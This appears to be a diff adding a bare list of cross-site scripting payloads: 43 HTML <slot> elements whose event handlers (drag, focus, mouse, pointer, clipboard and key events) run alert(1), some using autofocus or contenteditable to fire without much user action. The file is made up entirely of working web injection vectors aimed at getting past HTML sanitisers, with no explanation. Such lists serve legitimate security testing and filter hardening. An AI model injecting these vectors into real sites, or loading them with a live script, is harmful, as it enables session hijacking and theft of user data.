@@ -1,0 +1,43 @@
+<slot draggable="true" ondrag="alert(1)">test</slot>
+<slot draggable="true" ondragend="alert(1)">test</slot>
+<slot draggable="true" ondragenter="alert(1)">test</slot>
+<slot draggable="true" ondragleave="alert(1)">test</slot>
+<slot draggable="true" ondragstart="alert(1)">test</slot>
+<slot id=x tabindex=1 onactivate=alert(1)></slot>
+<slot id=x tabindex=1 onbeforeactivate=alert(1)></slot>
+<slot id=x tabindex=1 onbeforedeactivate=alert(1)></slot><input autofocus>
+<slot id=x tabindex=1 ondeactivate=alert(1)></slot><input id=y autofocus>
+<slot id=x tabindex=1 onfocus=alert(1)></slot>
+<slot id=x tabindex=1 onfocusin=alert(1)></slot>
+<slot onafterscriptexecute=alert(1)><script>1</script>
+<slot onbeforecopy="alert(1)" contenteditable>test</slot>
+<slot onbeforecut="alert(1)" contenteditable>test</slot>
+<slot onbeforepaste="alert(1)" contenteditable>test</slot>
+<slot onbeforescriptexecute=alert(1)><script>1</script>
+<slot onblur=alert(1) tabindex=1 id=x></slot><input autofocus>
+<slot onclick="alert(1)">test</slot>
+<slot oncontextmenu="alert(1)">test</slot>
+<slot oncopy=alert(1) value="XSS" autofocus tabindex=1>test
+<slot oncut=alert(1) value="XSS" autofocus tabindex=1>test
+<slot ondblclick="alert(1)" autofocus tabindex=1>test</slot>
+<slot onfocusout=alert(1) tabindex=1 id=x></slot><input autofocus>
+<slot onkeydown="alert(1)" contenteditable>test</slot>
+<slot onkeypress="alert(1)" contenteditable>test</slot>
+<slot onkeyup="alert(1)" contenteditable>test</slot>
+<slot onmousedown="alert(1)">test</slot>
+<slot onmouseenter="alert(1)">test</slot>
+<slot onmouseleave="alert(1)">test</slot>
+<slot onmousemove="alert(1)">test</slot>
+<slot onmouseout="alert(1)">test</slot>
+<slot onmouseover="alert(1)">test</slot>
+<slot onmouseup="alert(1)">test</slot>
+<slot onmousewheel=alert(1)>requires scrolling
+<slot onpaste="alert(1)" contenteditable>test</slot>
+<slot onpointerdown=alert(1)>XSS</slot>
+<slot onpointerenter=alert(1)>XSS</slot>
+<slot onpointerleave=alert(1)>XSS</slot>
+<slot onpointermove=alert(1)>XSS</slot>
+<slot onpointerout=alert(1)>XSS</slot>
+<slot onpointerover=alert(1)>XSS</slot>
+<slot onpointerrawupdate=alert(1)>XSS</slot>
+<slot onpointerup=alert(1)>XSS</slot>
